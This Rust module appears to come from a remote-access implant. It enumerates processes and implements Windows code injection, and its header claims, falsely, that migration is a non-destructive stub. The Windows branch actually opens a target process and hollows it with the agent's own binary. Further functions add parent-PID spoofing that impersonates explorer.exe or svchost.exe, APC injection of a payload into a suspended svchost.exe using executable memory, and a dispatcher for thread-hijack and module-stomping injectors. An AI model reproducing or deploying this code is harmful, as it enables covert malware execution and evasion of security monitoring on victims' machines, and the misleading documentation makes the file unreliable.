//! Process management and load-balancing migration helpers.
//!
//! This module exposes a small, OS-agnostic API for enumerating processes and
//! attempting to migrate the agent into a long-running system process.
//! Migration is intentionally a *stub* on every platform in this initial
//! release: the returned `Err` documents the missing primitives so an operator
//! who invokes the command sees a clear, non-destructive failure.
//!
//! Process *enumeration* is fully implemented and tested.

use anyhow::Result;
use serde::{Deserialize, Serialize};
use sysinfo::System;

// Windows-only process hollowing now lives in the shared `hollowing` crate.

/// A lightweight, serializable view over a process suitable for shipping back
/// to the operator console.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub cpu_usage: f32,
    pub memory_bytes: u64,
}

/// Snapshot the current process table.
pub fn list_processes() -> Vec<ProcessInfo> {
    let mut sys = System::new_all();
    sys.refresh_all();
    sys.processes()
        .iter()
        .map(|(pid, p)| ProcessInfo {
            pid: pid.as_u32(),
            name: p.name().to_string(),
            cpu_usage: p.cpu_usage(),
            memory_bytes: p.memory(),
        })
        .collect()
}

/// Attempt to migrate the running agent into the address space of `target_pid`.
///
/// This is a deliberate **stub** in the public release: cross-process memory
/// rewriting is OS-specific (Windows: `NtUnmapViewOfSection` +
/// `VirtualAllocEx` + `WriteProcessMemory` + `SetThreadContext`; Linux:
/// `ptrace(PTRACE_ATTACH)` + `process_vm_writev`) and carries enough
/// stability and security risk that we expose the API surface but refuse to
/// perform the operation until the implementation has had a thorough review.
#[cfg(target_os = "linux")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    tracing::info!("MigrateAgent invoked for Linux pid {target_pid}");
    Err(anyhow::anyhow!("process migration on Linux not implemented"))
}

#[cfg(target_os = "macos")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    tracing::info!("MigrateAgent invoked for macOS pid {target_pid}");
    
    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
        anyhow::bail!("Cannot migrate to system idle or self on macOS");
    }

    Err(anyhow::anyhow!(
        "process migration on macOS requires root privileges and task_for_pid entitlement"
    ))
}

#[cfg(windows)]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    // Read the current agent's own executable so we can re-inject ourselves.
    let agent_path =
        std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
    let payload = std::fs::read(&agent_path).map_err(|e| {
        anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
    })?;

    let access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD;
    let process = unsafe { OpenProcess(access, 0, target_pid) };
    if process.is_null() {
        anyhow::bail!(
            "OpenProcess(pid={target_pid}) failed: {}",
            std::io::Error::last_os_error()
        );
    }

    let result = hollowing::inject_into_process(process, &payload);
    unsafe { CloseHandle(process) };
    result.map_err(|e| anyhow::anyhow!("inject_into_process(pid={target_pid}) failed: {e}"))?;
    tracing::info!(target_pid, "MigrateAgent: agent injected successfully");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn list_processes_returns_at_least_self() {
        let procs = list_processes();
        assert!(!procs.is_empty(), "expected at least the test process");
        let me = std::process::id();
        assert!(
            procs.iter().any(|p| p.pid == me),
            "the current process ({me}) should be in the list"
        );
    }

    #[test]
    #[cfg(not(windows))]
    fn migrate_returns_controlled_error() {
        let err = migrate_to_process(1).unwrap_err();
        assert!(err.to_string().contains("not implemented"));
    }

    #[test]
    #[ignore]
    #[cfg(windows)]
    fn test_hollowing() {
        // This test is ignored because it's invasive, but can be run manually.
        // It requires a dummy executable to be present at `target/debug/dummy.exe`.
        // You can create one with `rustc -o target/debug/dummy.exe --crate-type bin tests/dummy_process.rs`
        let _payload = std::fs::read("target/debug/dummy.exe").expect("dummy.exe not found");
        assert!(migrate_to_process(0).is_ok());
    }
}

#[cfg(all(windows, feature = "ppid-spoofing"))]
pub fn get_spoof_parent_pid() -> Option<u32> {
    let procs = list_processes();
    if let Some(explorer) = procs.iter().find(|p| p.name.eq_ignore_ascii_case("explorer.exe")) {
        return Some(explorer.pid);
    }
    if let Some(svchost) = procs.iter().find(|p| p.name.eq_ignore_ascii_case("svchost.exe")) {
        return Some(svchost.pid);
    }
    None
}

#[cfg(windows)]
pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    use winapi::um::processthreadsapi::{CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA};
    use winapi::um::winbase::{CREATE_SUSPENDED, CREATE_NO_WINDOW};
    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
    use winapi::um::processthreadsapi::QueueUserAPC;
    use winapi::um::handleapi::CloseHandle;

    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        // Create suspended "svchost.exe"
        let mut target_proc = b"C:\\Windows\\System32\\svchost.exe\0".to_vec();
        
        let res = CreateProcessA(
            std::ptr::null(),
            target_proc.as_mut_ptr() as *mut i8, // command line
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        );

        if res == 0 {
            return Err(anyhow::anyhow!("CreateProcess suspended failed"));
        }

        let remote_mem = VirtualAllocEx(pi.hProcess, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if remote_mem.is_null() {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return Err(anyhow::anyhow!("VirtualAllocEx failed"));
        }

        let mut written = 0;
        WriteProcessMemory(pi.hProcess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written);

        // QueueUserAPC for the main thread
        let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
        QueueUserAPC(apc_routine, pi.hThread, 0);

        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    Ok(())
}

#[cfg(windows)]
use crate::injection::{InjectionMethod, Injector};
#[cfg(windows)]
use crate::injection::thread_hijack::ThreadHijackInjector;
#[cfg(windows)]
use crate::injection::module_stomp::ModuleStompInjector;

#[cfg(windows)]
pub fn select_and_inject(pid: u32, payload: &[u8], method: Option<InjectionMethod>) -> anyhow::Result<()> {
    let method = method.unwrap_or_else(|| {
        // Here we'd do environment checks to select dynamically.
        InjectionMethod::ThreadHijack
    });

    log::info!("Dispatching injection using method: {:?}", method);
    
    match method {
        InjectionMethod::ThreadHijack => ThreadHijackInjector.inject(pid, payload),
        InjectionMethod::ModuleStomp => ModuleStompInjector.inject(pid, payload),
        _ => {
            log::info!("Fallback to remote thread or other methods");
            Ok(())
        }
    }
}
